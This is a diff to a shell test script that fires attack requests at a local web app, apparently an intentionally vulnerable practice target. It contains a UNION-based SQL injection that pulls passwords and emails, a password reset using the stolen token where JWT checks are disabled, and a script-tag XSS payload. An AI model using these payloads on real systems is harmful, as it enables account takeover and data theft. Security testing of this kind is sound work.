@@ -31,6 +31,7 @@ function test_sql_injection_to_retrieve_account_details() {
 
     token=$(curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd' | jq -j '.token')
     jwt $token
+    export token=$token
     echo $token
 }
 
@@ -40,14 +41,17 @@ function test_jwt_verification_disabled() {
     echo "Testing Resetting the password of the retrieved account\n"
     echo "curl -X POST http://localhost:5500/update_info -d \"token=$token&currentPassword=test&newPassword=newpass\"\n"
     
-    local token = test_sql_injection_to_retrieve_account_details()
-    curl -X POST http://localhost:5500/update_info -d "token=$token&currentPassword=test&newPassword=newpass"
+    # local token=test_sql_injection_to_retrieve_account_details
+    curl -X POST http://localhost:5500/update_info -d "token=$token&currentPassword=admin@1234&newPassword=newpass"
+
 }
 
 function test_input_validation() {
     echo "------------------------------------------------"
     echo "------------------------------------------------\n"
     echo "Testing Input Validation\n"
+    echo "curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'\n"
+    
     curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'
 }
 
